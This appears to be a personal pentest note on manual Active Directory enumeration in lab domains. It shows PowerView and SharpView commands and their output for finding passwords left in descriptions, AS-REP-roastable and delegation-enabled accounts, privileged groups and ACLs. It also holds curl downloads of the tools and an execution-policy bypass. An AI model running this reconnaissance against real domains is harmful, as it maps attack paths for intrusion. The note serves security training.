---
title: Active Directory Manual Internal Enumeration
date: 2026-07-25
ShowToc: true
draft: false
TocOpen: true
password:
isPrivate: true
tags:
  - blog
  - note-ad
lastmod: 2026-08-10T07:45:38.444Z
---
# Box Info

{{< htb-info "https://www.hackthebox.com/machines/yourmachine" >}}

![zv91BDI7.canvas](/ob/Canvas/zv91BDI7.canvas)\
{{< canvas "zv91BDI7.canvas" >}}

### AD Powerview & SharpView.exe Import

```
PS C:\Users\jtest>  curl http://192.168.154.10/PowerView.ps1 -O PowerView.ps1
PS C:\Users\jtest> curl http://192.168.154.10/SharpView.exe -O SharpView.exe
```

one line command

```
powershell
```

```
Set-ExecutionPolicy Bypass -Scope Process -Force;Import-Module .\\PowerView.ps1 -Force;. .\\PowerView.ps1;Get-NetDomain
```

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
```

```
Import-Module .\\PowerView.ps1 -Force
```

```powershell
. .\\PowerView.ps1
```

```powershell
Get-NetDomain
```

### Users part

#### How many users ?

##### Powerview

```
PS C:\Users\jtest\Desktop> (Get-DomainUser).count
5
```

##### Remote Server Administration Tools (RAST)

```
(Get-ADUser -Filter *).Count
```

#### Check for any domain users with sensitive data such as a password stored in the description field.

##### Powerview

```
PS C:\Users\jtest\Desktop> Get-DomainUser -Properties samaccountname,description

samaccountname description
-------------- -----------
Administrator  Built-in account for administering the computer/domain
Guest          Built-in account for guest access to the computer/domain
krbtgt         Key Distribution Center Service Account
jtest          My password is P@ssw0rd!1234
EmptyUser

```

##### Remote Server Administration Tools (RAST)

```
PS C:\Users\jtest\Desktop> Get-ADUser -Properties * -LDAPFilter '(objectCategory=user)' | select  Description, CanonicalName ,SamAccountName

Description                                              CanonicalName                  SamAccountName
-----------                                              -------------                  --------------
Built-in account for administering the computer/domain   test.local/Users/Administrator Administrator
Built-in account for guest access to the computer/domain                                Guest
Key Distribution Center Service Account                  test.local/Users/krbtgt        krbtgt
My password is P@ssw0rd!1234                             test.local/IT/John Test        jtest
                                                                                        EmptyUser
```

#### Check the spn (for AS-REPRoastable attack )

##### Powerview

```
PS C:\Users\jtest\Desktop> Get-DomainUser -UACFilter DONT_REQ_PREAUTH


logoncount                    : 2
badpasswordtime               : 12/31/1600 4:00:00 PM
distinguishedname             : CN=sql_service,CN=Users,DC=test,DC=local
objectclass                   : {top, person, organizationalPerson, user}
lastlogontimestamp            : 7/24/2026 10:32:51 PM
name                          : sql_service
objectsid                     : S-1-5-21-84984185-259362343-599180476-2601
samaccountname                : sql_service
codepage                      : 0
samaccounttype                : USER_OBJECT
accountexpires                : NEVER
countrycode                   : 0
whenchanged                   : 7/25/2026 6:15:41 AM
instancetype                  : 4
objectguid                    : 5b550444-1fbb-4404-a73a-c58132d756ee
lastlogon                     : 7/24/2026 10:35:17 PM
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=test,DC=local
dscorepropagationdata         : 1/1/1601 12:00:00 AM
serviceprincipalname          : {MSSQLSvc/WIN-6G6KPL3P3MA.test.local\SQLEXPRESS,
                                MSSQLSvc/WIN-6G6KPL3P3MA.test.local:1433, MSSQLSvc/WIN-6G6KPL3P3MA\SQLEXPRESS,
                                MSSQLSvc/WIN-6G6KPL3P3MA:1433}
whencreated                   : 7/25/2026 4:48:58 AM
badpwdcount                   : 0
cn                            : sql_service
useraccountcontrol            : NORMAL_ACCOUNT, DONT_REQ_PREAUTH
usncreated                    : 16427
primarygroupid                : 513
pwdlastset                    : 7/24/2026 9:48:58 PM
msds-supportedencryptiontypes : 0
usnchanged                    : 16469
```

##### other related domain

```
PS C:\htb> Find-ForeignGroup

GroupDomain             : INLANEFREIGHT.LOCAL
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL
MemberDomain            : INLANEFREIGHT.LOCAL
MemberName              : S-1-5-21-888139820-103978830-333442103-1602
MemberDistinguishedName : CN=S-1-5-21-888139820-103978830-333442103-1602,CN=ForeignSecurityPrincipals,DC=INLANEFREIGHT,
                          DC=LOCAL
```

```
PS C:\htb> Convert-SidToName S-1-5-21-888139820-103978830-333442103-1602

FREIGHTLOGISTIC\harry.jones
```

```
PS C:\htb> Get-DomainUser -SPN -Domain freightlogistics.local | select samaccountname,memberof,serviceprincipalname | fl

samaccountname       : krbtgt
memberof             : CN=Denied RODC Password Replication Group,CN=Users,DC=freightlogistics,DC=local
serviceprincipalname : kadmin/changepw

samaccountname       : svc_azure
memberof             : CN=Account Operators,CN=Builtin,DC=freightlogistics,DC=local
serviceprincipalname : freightlogistics/azureconnect:443
```

#### Check Kerberos constrained delegation(constrained Delegation attack)

PS C:\Users\jtest\Desktop> .\SharpView.exe Get-DomainUser -TrustedToAuth -Properties samaccountname,useraccountcontrol,memberof

\[Get-DomainSearcher] search base: LDAP://WIN-6G6KPL3P3MA.TEST.LOCAL/DC=TEST,DC=LOCAL\
\[Get-DomainUser] Searching for users that are trusted to authenticate for other principals\
\[Get-DomainUser] filter string: (&(samAccountType=805306368)(msds-allowedtodelegateto=\*))\
useraccountcontrol             : NORMAL\_ACCOUNT\
samaccountname                 : web\_svc

```

#### check Kerberos unconstrained delegation(Unconstrained Delegation attack)

```

PS C:\Users\jtest\Desktop> .\SharpView.exe Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"

\[Get-DomainSearcher] search base: LDAP://WIN-6G6KPL3P3MA.TEST.LOCAL/DC=TEST,DC=LOCAL\
\[Get-DomainUser] Using additional LDAP filter: (userAccountControl:1.2.840.113556.1.4.803:=524288)\
\[Get-DomainUser] filter string: (&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))\
objectsid                      : {S-1-5-21-84984185-259362343-599180476-1103}\
samaccounttype                 : USER\_OBJECT\
objectguid                     : 37bbba99-1043-42fe-b63a-96bb03927099\
useraccountcontrol             : NORMAL\_ACCOUNT, TRUSTED\_FOR\_DELEGATION\
accountexpires                 : NEVER\
lastlogon                      : 7/24/2026 11:56:04 PM\
lastlogontimestamp             : 7/17/2026 3:47:15 PM\
pwdlastset                     : 7/17/2026 3:29:00 PM\
lastlogoff                     : 12/31/1600 4:00:00 PM\
badPasswordTime                : 7/24/2026 11:36:17 PM\
name                           : John Test\
distinguishedname              : CN=John Test,OU=IT,DC=test,DC=local\
whencreated                    : 7/17/2026 10:29:00 PM\
whenchanged                    : 7/24/2026 12:43:21 PM\
samaccountname                 : jtest\
memberof                       : {CN=IT-Staff,OU=IT,DC=test,DC=local, CN=Administrators,CN=Builtin,DC=test,DC=local}\
cn                             : {John Test}\
objectclass                    : {top, person, organizationalPerson, user}\
admincount                     : 1\
badpwdcount                    : 0\
countrycode                    : 0\
usnchanged                     : 12953\
logoncount                     : 20\
primarygroupid                 : 513\
objectcategory                 : CN=Person,CN=Schema,CN=Configuration,DC=test,DC=local\
description                    : My password is P@ssw0rd!1234\
dscorepropagationdata          : {7/24/2026 12:43:21 PM, 7/17/2026 10:32:26 PM, 1/1/1601 12:00:00 AM}\
usncreated                     : 12757\
instancetype                   : 4\
codepage                       : 0

```

----

### Groups part 

#### Check all group 

```

PS C:\Users\jtest\Desktop>\
Get-DomainGroup -Properties Name\
50

name

Administrators\
Users\
Guests\
Print Operators\
Backup Operators\
Replicator\
Remote Desktop Users\
Network Configuration Operators\
Performance Monitor Users\
Performance Log Users\
Distributed COM Users\
IIS\_IUSRS\
Cryptographic Operators\
Event Log Readers\
Certificate Service DCOM Access\
RDS Remote Access Servers\
RDS Endpoint Servers\
RDS Management Servers\
Hyper-V Administrators\
Access Control Assistance Operators\
Remote Management Users\
Storage Replica Administrators\
Domain Computers\
Domain Controllers\
Schema Admins\
Enterprise Admins\
Cert Publishers\
Domain Admins\
Domain Users\
Domain Guests\
Group Policy Creator Owners\
RAS and IAS Servers\
Server Operators\
Account Operators\
Pre-Windows 2000 Compatible Access\
Incoming Forest Trust Builders\
Windows Authorization Access Group\
Terminal Server License Servers\
Allowed RODC Password Replication Group\
Denied RODC Password Replication Group\
Read-only Domain Controllers\
Enterprise Read-only Domain Controllers\
Cloneable Domain Controllers\
Protected Users\
Key Admins\
Enterprise Key Admins\
DnsAdmins\
DnsUpdateProxy\
IT-Staff\
SQLServer2005SQLBrowserUser\$WIN-6G6KPL3P3MA

```



#### The group has who ? 


```

PS C:\Users\jtest\Desktop> .\SharpView.exe Get-DomainGroupMember -Identity 'Administrators'\
\[Get-DomainSearcher] search base: LDAP://WIN-6G6KPL3P3MA.TEST.LOCAL/DC=TEST,DC=LOCAL\
\[Get-DomainGroupMember] Get-DomainGroupMember filter string: (&(objectCategory=group)(|(samAccountName=Administrators)))\
\[Get-DomainSearcher] search base: LDAP://WIN-6G6KPL3P3MA.TEST.LOCAL/DC=TEST,DC=LOCAL\
\[Get-DomainObject] Extracted domain 'test.local' from 'CN=John Test,OU=IT,DC=test,DC=local'\
\[Get-DomainSearcher] search base: LDAP://WIN-6G6KPL3P3MA.TEST.LOCAL/DC=test,DC=local\
\[Get-DomainObject] Get-DomainComputer filter string: (&(|(distinguishedname=CN=John Test,OU=IT,DC=test,DC=local)))\
\[Get-DomainSearcher] search base: LDAP://WIN-6G6KPL3P3MA.TEST.LOCAL/DC=TEST,DC=LOCAL\
\[Get-DomainObject] Extracted domain 'test.local' from 'CN=Domain Admins,CN=Users,DC=test,DC=local'\
\[Get-DomainSearcher] search base: LDAP://WIN-6G6KPL3P3MA.TEST.LOCAL/DC=test,DC=local\
\[Get-DomainObject] Get-DomainComputer filter string: (&(|(distinguishedname=CN=Domain Admins,CN=Users,DC=test,DC=local)))\
\[Get-DomainSearcher] search base: LDAP://WIN-6G6KPL3P3MA.TEST.LOCAL/DC=TEST,DC=LOCAL\
\[Get-DomainObject] Extracted domain 'test.local' from 'CN=Enterprise Admins,CN=Users,DC=test,DC=local'\
\[Get-DomainSearcher] search base: LDAP://WIN-6G6KPL3P3MA.TEST.LOCAL/DC=test,DC=local\
\[Get-DomainObject] Get-DomainComputer filter string: (&(|(distinguishedname=CN=Enterprise Admins,CN=Users,DC=test,DC=local)))\
\[Get-DomainSearcher] search base: LDAP://WIN-6G6KPL3P3MA.TEST.LOCAL/DC=TEST,DC=LOCAL\
\[Get-DomainObject] Extracted domain 'test.local' from 'CN=Administrator,CN=Users,DC=test,DC=local'\
\[Get-DomainSearcher] search base: LDAP://WIN-6G6KPL3P3MA.TEST.LOCAL/DC=test,DC=local\
\[Get-DomainObject] Get-DomainComputer filter string: (&(|(distinguishedname=CN=Administrator,CN=Users,DC=test,DC=local)))\
GroupDomain                    : test,local\
GroupName                      : Administrators\
GroupDistinguishedName         : CN=Administrators,CN=Builtin,DC=test,DC=local\
MemberDomain                   : test.local\
MemberName                     : jtest\
MemberDistinguishedName        : CN=John Test,OU=IT,DC=test,DC=local\
MemberObjectClass              : user\
MemberSID                      : S-1-5-21-84984185-259362343-599180476-1103

GroupDomain                    : test,local\
GroupName                      : Administrators\
GroupDistinguishedName         : CN=Administrators,CN=Builtin,DC=test,DC=local\
MemberDomain                   : test.local\
MemberName                     : Domain Admins\
MemberDistinguishedName        : CN=Domain Admins,CN=Users,DC=test,DC=local\
MemberObjectClass              : group\
MemberSID                      : S-1-5-21-84984185-259362343-599180476-512

GroupDomain                    : test,local\
GroupName                      : Administrators\
GroupDistinguishedName         : CN=Administrators,CN=Builtin,DC=test,DC=local\
MemberDomain                   : test.local\
MemberName                     : Enterprise Admins\
MemberDistinguishedName        : CN=Enterprise Admins,CN=Users,DC=test,DC=local\
MemberObjectClass              : group\
MemberSID                      : S-1-5-21-84984185-259362343-599180476-519

GroupDomain                    : test,local\
GroupName                      : Administrators\
GroupDistinguishedName         : CN=Administrators,CN=Builtin,DC=test,DC=local\
MemberDomain                   : test.local\
MemberName                     : Administrator\
MemberDistinguishedName        : CN=Administrator,CN=Users,DC=test,DC=local\
MemberObjectClass              : user\
MemberSID                      : S-1-5-21-84984185-259362343-599180476-500

```

#### check the user is which group

```

PS C:\Users\Administrator\Desktop> Get-NetGroup -MemberIdentity "sql\_service"

usncreated             : 12348\
grouptype              : GLOBAL\_SCOPE, SECURITY\
samaccounttype         : GROUP\_OBJECT\
samaccountname         : Domain Users\
whenchanged            : 7/17/2026 10:18:26 PM\
objectsid              : S-1-5-21-84984185-259362343-599180476-513\
objectclass            : {top, group}\
cn                     : Domain Users\
usnchanged             : 12350\
dscorepropagationdata  : {7/17/2026 10:18:26 PM, 1/1/1601 12:00:01 AM}\
memberof               : CN=Users,CN=Builtin,DC=test,DC=local\
iscriticalsystemobject : True\
description            : All domain users\
distinguishedname      : CN=Domain Users,CN=Users,DC=test,DC=local\
name                   : Domain Users\
whencreated            : 7/17/2026 10:18:26 PM\
instancetype           : 4\
objectguid             : abdef77d-dad6-441f-8f9e-719c7b3c33a7\
objectcategory         : CN=Group,CN=Schema,CN=Configuration,DC=test,DC=local

```



#### AD groups with the `AdminCount` attribute set to 1, signifying that this is a protected group.

```

PS C:\Users\jtest\Desktop> .\SharpView.exe Get-DomainGroup -AdminCount\
\[Get-DomainSearcher] search base: LDAP://WIN-6G6KPL3P3MA.TEST.LOCAL/DC=TEST,DC=LOCAL\
\[Get-DomainGroup] Searching for adminCount=1\
\[Get-DomainGroup] filter string: (&(objectCategory=group)(admincount=1))\
objectsid                      : {S-1-5-32-544}\
grouptype                      : CREATED\_BY\_SYSTEM, DOMAIN\_LOCAL\_SCOPE, SECURITY\
samaccounttype                 : ALIAS\_OBJECT\
objectguid                     : 12ca510a-29d8-4f59-95d5-014e247914b9\
name                           : Administrators\
distinguishedname              : CN=Administrators,CN=Builtin,DC=test,DC=local\
whencreated                    : 7/17/2026 10:17:23 PM\
whenchanged                    : 7/24/2026 12:22:31 PM\
samaccountname                 : Administrators\
member                         : {CN=John Test,OU=IT,DC=test,DC=local, CN=Domain Admins,CN=Users,DC=test,DC=local, CN=Enterprise Admins,CN=Users,DC=test,DC=local, CN=Administrator,CN=Users,DC=test,DC=local}\
cn                             : {Administrators}\
objectclass                    : {top, group}\
iscriticalsystemobject         : True\
usnchanged                     : 12947\
description                    : Administrators have complete and unrestricted access to the computer/domain\
systemflags                    : -1946157056\
objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=test,DC=local\
usncreated                     : 8199\
admincount                     : 1\
dscorepropagationdata          : {7/17/2026 10:33:36 PM, 7/17/2026 10:18:26 PM, 1/1/1601 12:04:16 AM}\
instancetype                   : 4

objectsid                      : {S-1-5-32-550}\
grouptype                      : CREATED\_BY\_SYSTEM, DOMAIN\_LOCAL\_SCOPE, SECURITY\
samaccounttype                 : ALIAS\_OBJECT\
objectguid                     : 1f2de0a4-d4b3-401d-823e-a553eb922479\
name                           : Print Operators\
distinguishedname              : CN=Print Operators,CN=Builtin,DC=test,DC=local\
whencreated                    : 7/17/2026 10:17:23 PM\
whenchanged                    : 7/17/2026 10:33:36 PM\
samaccountname                 : Print Operators\
cn                             : {Print Operators}\
objectclass                    : {top, group}\
iscriticalsystemobject         : True\
usnchanged                     : 12779\
systemflags                    : -1946157056\
objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=test,DC=local\
usncreated                     : 8211\
admincount                     : 1\
description                    : Members can administer printers installed on domain controllers\
dscorepropagationdata          : {7/17/2026 10:33:36 PM, 7/17/2026 10:18:26 PM, 1/1/1601 12:04:16 AM}\
instancetype                   : 4

objectsid                      : {S-1-5-32-551}\
grouptype                      : CREATED\_BY\_SYSTEM, DOMAIN\_LOCAL\_SCOPE, SECURITY\
samaccounttype                 : ALIAS\_OBJECT\
objectguid                     : 54438d9b-6521-4705-8fdd-acc60edb82ad\
name                           : Backup Operators\
distinguishedname              : CN=Backup Operators,CN=Builtin,DC=test,DC=local\
whencreated                    : 7/17/2026 10:17:23 PM\
whenchanged                    : 7/17/2026 10:33:36 PM\
samaccountname                 : Backup Operators\
cn                             : {Backup Operators}\
objectclass                    : {top, group}\
iscriticalsystemobject         : True\
usnchanged                     : 12777\
systemflags                    : -1946157056\
objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=test,DC=local\
usncreated                     : 8212\
admincount                     : 1\
description                    : Backup Operators can override security restrictions for the sole purpose of backing up or restoring files\
dscorepropagationdata          : {7/17/2026 10:33:36 PM, 7/17/2026 10:18:26 PM, 1/1/1601 12:04:16 AM}\
instancetype                   : 4

objectsid                      : {S-1-5-32-552}\
grouptype                      : CREATED\_BY\_SYSTEM, DOMAIN\_LOCAL\_SCOPE, SECURITY\
samaccounttype                 : ALIAS\_OBJECT\
objectguid                     : a6e8e221-9a20-48f3-8421-e435ca27c743\
name                           : Replicator\
distinguishedname              : CN=Replicator,CN=Builtin,DC=test,DC=local\
whencreated                    : 7/17/2026 10:17:23 PM\
whenchanged                    : 7/17/2026 10:33:36 PM\
samaccountname                 : Replicator\
cn                             : {Replicator}\
objectclass                    : {top, group}\
iscriticalsystemobject         : True\
usnchanged                     : 12774\
systemflags                    : -1946157056\
objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=test,DC=local\
usncreated                     : 8213\
admincount                     : 1\
description                    : Supports file replication in a domain\
dscorepropagationdata          : {7/17/2026 10:33:36 PM, 7/17/2026 10:18:26 PM, 1/1/1601 12:04:16 AM}\
instancetype                   : 4

objectsid                      : {S-1-5-21-84984185-259362343-599180476-516}\
grouptype                      : GLOBAL\_SCOPE, SECURITY\
samaccounttype                 : GROUP\_OBJECT\
objectguid                     : 1ea43738-5204-47e9-b117-b676ae34ced3\
name                           : Domain Controllers\
distinguishedname              : CN=Domain Controllers,CN=Users,DC=test,DC=local\
whencreated                    : 7/17/2026 10:18:26 PM\
whenchanged                    : 7/17/2026 10:33:36 PM\
samaccountname                 : Domain Controllers\
memberof                       : {CN=Denied RODC Password Replication Group,CN=Users,DC=test,DC=local}\
cn                             : {Domain Controllers}\
objectclass                    : {top, group}\
iscriticalsystemobject         : True\
usnchanged                     : 12783\
description                    : All domain controllers in the domain\
objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=test,DC=local\
usncreated                     : 12333\
admincount                     : 1\
dscorepropagationdata          : {7/17/2026 10:33:36 PM, 7/17/2026 10:18:26 PM, 1/1/1601 12:04:16 AM}\
instancetype                   : 4

objectsid                      : {S-1-5-21-84984185-259362343-599180476-518}\
grouptype                      : UNIVERSAL\_SCOPE, SECURITY\
samaccounttype                 : GROUP\_OBJECT\
objectguid                     : a285ec28-14c8-478b-89ec-1ef4db1255d1\
name                           : Schema Admins\
distinguishedname              : CN=Schema Admins,CN=Users,DC=test,DC=local\
whencreated                    : 7/17/2026 10:18:26 PM\
whenchanged                    : 7/17/2026 10:33:36 PM\
samaccountname                 : Schema Admins\
member                         : {CN=Administrator,CN=Users,DC=test,DC=local}\
memberof                       : {CN=Denied RODC Password Replication Group,CN=Users,DC=test,DC=local}\
cn                             : {Schema Admins}\
objectclass                    : {top, group}\
iscriticalsystemobject         : True\
usnchanged                     : 12765\
description                    : Designated administrators of the schema\
objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=test,DC=local\
usncreated                     : 12336\
admincount                     : 1\
dscorepropagationdata          : {7/17/2026 10:33:36 PM, 7/17/2026 10:18:26 PM, 1/1/1601 12:04:16 AM}\
instancetype                   : 4

objectsid                      : {S-1-5-21-84984185-259362343-599180476-519}\
grouptype                      : UNIVERSAL\_SCOPE, SECURITY\
samaccounttype                 : GROUP\_OBJECT\
objectguid                     : 095990d9-ab8c-4516-b227-98e9426de3f1\
name                           : Enterprise Admins\
distinguishedname              : CN=Enterprise Admins,CN=Users,DC=test,DC=local\
whencreated                    : 7/17/2026 10:18:26 PM\
whenchanged                    : 7/17/2026 10:33:36 PM\
samaccountname                 : Enterprise Admins\
member                         : {CN=Administrator,CN=Users,DC=test,DC=local}\
memberof                       : {CN=Denied RODC Password Replication Group,CN=Users,DC=test,DC=local, CN=Administrators,CN=Builtin,DC=test,DC=local}\
cn                             : {Enterprise Admins}\
objectclass                    : {top, group}\
iscriticalsystemobject         : True\
usnchanged                     : 12770\
description                    : Designated administrators of the enterprise\
objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=test,DC=local\
usncreated                     : 12339\
admincount                     : 1\
dscorepropagationdata          : {7/17/2026 10:33:36 PM, 7/17/2026 10:18:26 PM, 1/1/1601 12:04:16 AM}\
instancetype                   : 4

objectsid                      : {S-1-5-21-84984185-259362343-599180476-512}\
grouptype                      : GLOBAL\_SCOPE, SECURITY\
samaccounttype                 : GROUP\_OBJECT\
objectguid                     : f5678b3b-2075-43cd-a42e-9ec7315e9756\
name                           : Domain Admins\
distinguishedname              : CN=Domain Admins,CN=Users,DC=test,DC=local\
whencreated                    : 7/17/2026 10:18:26 PM\
whenchanged                    : 7/17/2026 10:33:36 PM\
samaccountname                 : Domain Admins\
member                         : {CN=Administrator,CN=Users,DC=test,DC=local}\
memberof                       : {CN=Denied RODC Password Replication Group,CN=Users,DC=test,DC=local, CN=Administrators,CN=Builtin,DC=test,DC=local}\
cn                             : {Domain Admins}\
objectclass                    : {top, group}\
iscriticalsystemobject         : True\
usnchanged                     : 12766\
description                    : Designated administrators of the domain\
objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=test,DC=local\
usncreated                     : 12345\
admincount                     : 1\
dscorepropagationdata          : {7/17/2026 10:33:36 PM, 7/17/2026 10:18:26 PM, 1/1/1601 12:04:16 AM}\
instancetype                   : 4

objectsid                      : {S-1-5-32-549}\
grouptype                      : CREATED\_BY\_SYSTEM, DOMAIN\_LOCAL\_SCOPE, SECURITY\
samaccounttype                 : ALIAS\_OBJECT\
objectguid                     : bc8c2adf-7145-44f2-b830-3ec9e9b8c109\
name                           : Server Operators\
distinguishedname              : CN=Server Operators,CN=Builtin,DC=test,DC=local\
whencreated                    : 7/17/2026 10:18:26 PM\
whenchanged                    : 7/17/2026 10:33:36 PM\
samaccountname                 : Server Operators\
cn                             : {Server Operators}\
objectclass                    : {top, group}\
iscriticalsystemobject         : True\
usnchanged                     : 12780\
systemflags                    : -1946157056\
objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=test,DC=local\
usncreated                     : 12360\
admincount                     : 1\
description                    : Members can administer domain servers\
dscorepropagationdata          : {7/17/2026 10:33:36 PM, 7/17/2026 10:18:26 PM, 1/1/1601 12:04:16 AM}\
instancetype                   : 4

objectsid                      : {S-1-5-32-548}\
grouptype                      : CREATED\_BY\_SYSTEM, DOMAIN\_LOCAL\_SCOPE, SECURITY\
samaccounttype                 : ALIAS\_OBJECT\
objectguid                     : df7a343a-30c0-4497-aaaa-0e018ac7977a\
name                           : Account Operators\
distinguishedname              : CN=Account Operators,CN=Builtin,DC=test,DC=local\
whencreated                    : 7/17/2026 10:18:26 PM\
whenchanged                    : 7/17/2026 10:33:36 PM\
samaccountname                 : Account Operators\
cn                             : {Account Operators}\
objectclass                    : {top, group}\
iscriticalsystemobject         : True\
usnchanged                     : 12775\
systemflags                    : -1946157056\
objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=test,DC=local\
usncreated                     : 12363\
admincount                     : 1\
description                    : Members can administer domain user and group accounts\
dscorepropagationdata          : {7/17/2026 10:33:36 PM, 7/17/2026 10:18:26 PM, 1/1/1601 12:04:16 AM}\
instancetype                   : 4

objectsid                      : {S-1-5-21-84984185-259362343-599180476-521}\
grouptype                      : GLOBAL\_SCOPE, SECURITY\
samaccounttype                 : GROUP\_OBJECT\
objectguid                     : 3ad8f580-c873-42f2-9982-9e3cfb0630d0\
name                           : Read-only Domain Controllers\
distinguishedname              : CN=Read-only Domain Controllers,CN=Users,DC=test,DC=local\
whencreated                    : 7/17/2026 10:18:26 PM\
whenchanged                    : 7/17/2026 10:33:36 PM\
samaccountname                 : Read-only Domain Controllers\
memberof                       : {CN=Denied RODC Password Replication Group,CN=Users,DC=test,DC=local}\
cn                             : {Read-only Domain Controllers}\
objectclass                    : {top, group}\
iscriticalsystemobject         : True\
usnchanged                     : 12784\
description                    : Members of this group are Read-Only Domain Controllers in the domain\
objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=test,DC=local\
usncreated                     : 12419\
admincount                     : 1\
dscorepropagationdata          : {7/17/2026 10:33:36 PM, 7/17/2026 10:18:26 PM, 1/1/1601 12:04:16 AM}\
instancetype                   : 4

objectsid                      : {S-1-5-21-84984185-259362343-599180476-526}\
grouptype                      : GLOBAL\_SCOPE, SECURITY\
samaccounttype                 : GROUP\_OBJECT\
objectguid                     : 55106913-60dd-498f-8cba-8bd080263edd\
name                           : Key Admins\
distinguishedname              : CN=Key Admins,CN=Users,DC=test,DC=local\
whencreated                    : 7/17/2026 10:18:26 PM\
whenchanged                    : 7/17/2026 10:33:36 PM\
samaccountname                 : Key Admins\
cn                             : {Key Admins}\
objectclass                    : {top, group}\
iscriticalsystemobject         : True\
usnchanged                     : 12764\
objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=test,DC=local\
usncreated                     : 12450\
admincount                     : 1\
description                    : Members of this group can perform administrative actions on key objects within the domain.\
dscorepropagationdata          : {7/17/2026 10:33:36 PM, 7/17/2026 10:18:26 PM, 1/1/1601 12:04:16 AM}\
instancetype                   : 4

objectsid                      : {S-1-5-21-84984185-259362343-599180476-527}\
grouptype                      : UNIVERSAL\_SCOPE, SECURITY\
samaccounttype                 : GROUP\_OBJECT\
objectguid                     : 363e876c-e55b-4674-92a1-4b4c37773770\
name                           : Enterprise Key Admins\
distinguishedname              : CN=Enterprise Key Admins,CN=Users,DC=test,DC=local\
whencreated                    : 7/17/2026 10:18:26 PM\
whenchanged                    : 7/17/2026 10:33:36 PM\
samaccountname                 : Enterprise Key Admins\
cn                             : {Enterprise Key Admins}\
objectclass                    : {top, group}\
iscriticalsystemobject         : True\
usnchanged                     : 12769\
objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=test,DC=local\
usncreated                     : 12453\
admincount                     : 1\
description                    : Members of this group can perform administrative actions on key objects within the forest.\
dscorepropagationdata          : {7/17/2026 10:33:36 PM, 7/17/2026 10:18:26 PM, 1/1/1601 12:04:16 AM}\
instancetype                   : 4

```


### AD computer 

#### Find all computers 

```

PS C:\Users\Administrator\Desktop> .\SharpView.exe Get-DomainComputer -Properties dnshostname,operatingsystem,lastlogontimestamp,useraccountcontrol\
\[Get-DomainSearcher] search base: LDAP://WIN-6G6KPL3P3MA.TEST.LOCAL/DC=TEST,DC=LOCAL\
\[Get-DomainComputer] Get-DomainComputer filter string: (&(samAccountType=805306369))\
useraccountcontrol             : SERVER\_TRUST\_ACCOUNT, TRUSTED\_FOR\_DELEGATION\
lastlogontimestamp             : 7/28/2026 10:15:07 PM\
dnshostname                    : WIN-6G6KPL3P3MA.test.local\
operatingsystem                : Windows Server 2022 Datacenter Evaluation

useraccountcontrol             : WORKSTATION\_TRUST\_ACCOUNT, TRUSTED\_FOR\_DELEGATION

```


#### unconstrained delegation Computer 

```

PS C:\Users\Administrator\Desktop> .\SharpView.exe Get-DomainComputer -Unconstrained -Properties dnshostname,useraccountcontrol\
\[Get-DomainSearcher] search base: LDAP://WIN-6G6KPL3P3MA.TEST.LOCAL/DC=TEST,DC=LOCAL\
\[Get-DomainComputer] Searching for computers with for unconstrained delegation\
\[Get-DomainComputer] Get-DomainComputer filter string: (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))\
useraccountcontrol             : SERVER\_TRUST\_ACCOUNT, TRUSTED\_FOR\_DELEGATION\
dnshostname                    : WIN-6G6KPL3P3MA.test.local

useraccountcontrol             : WORKSTATION\_TRUST\_ACCOUNT, TRUSTED\_FOR\_DELEGATION

```


#### constrained delegation Computer 

```

PS C:\htb> Get-DomainComputer -TrustedToAuth | select -Property dnshostname,useraccountcontrol

dnshostname                                                        useraccountcontrol

***

EXCHG01.INLANEFREIGHT.LOCAL                                 WORKSTATION\_TRUST\_ACCOUNT\
SQL01.INLANEFREIGHT.LOCAL   WORKSTATION\_TRUST\_ACCOUNT, TRUSTED\_TO\_AUTH\_FOR\_DELEGATION

```

### ACL  part 

#### Check single user 's acl to another user 

powershell

```

PS C:\Users\Administrator\Desktop> (Get-ACL "AD:\$((Get-ADUser sql\_service).distinguishedname)").access

ActiveDirectoryRights : GenericRead\
InheritanceType       : None\
ObjectType            : 00000000-0000-0000-0000-000000000000\
InheritedObjectType   : 00000000-0000-0000-0000-000000000000\
ObjectFlags           : None\
AccessControlType     : Allow\
IdentityReference     : NT AUTHORITY\SELF\
IsInherited           : False\
InheritanceFlags      : None\
PropagationFlags      : None

ActiveDirectoryRights : ReadControl\
InheritanceType       : None\
ObjectType            : 00000000-0000-0000-0000-000000000000\
InheritedObjectType   : 00000000-0000-0000-0000-000000000000\
ObjectFlags           : None\
AccessControlType     : Allow\
IdentityReference     : NT AUTHORITY\Authenticated Users\
IsInherited           : False

```


CMD

```

PS C:\htb> (Get-ACL "AD:$((Get-ADUser daniel.carter).distinguishedname)").access  | ? {$\_.IdentityReference -eq "INLANEFREIGHT\cliff.moore"}

ActiveDirectoryRights : ReadProperty, WriteProperty, GenericExecute\
InheritanceType       : All\
ObjectType            : 00000000-0000-0000-0000-000000000000\
InheritedObjectType   : 00000000-0000-0000-0000-000000000000\
ObjectFlags           : None\
AccessControlType     : Allow\
IdentityReference     : INLANEFREIGHT\cliff.moore\
IsInherited           : False\
InheritanceFlags      : ContainerInherit\
PropagationFlags      : None

ActiveDirectoryRights : ExtendedRight\
InheritanceType       : All\
ObjectType            : ab721a53-1e2f-11d0-9819-00aa0040529b\
InheritedObjectType   : 00000000-0000-0000-0000-000000000000\
ObjectFlags           : ObjectAceTypePresent\
AccessControlType     : Allow\
IdentityReference     : INLANEFREIGHT\cliff.moore\
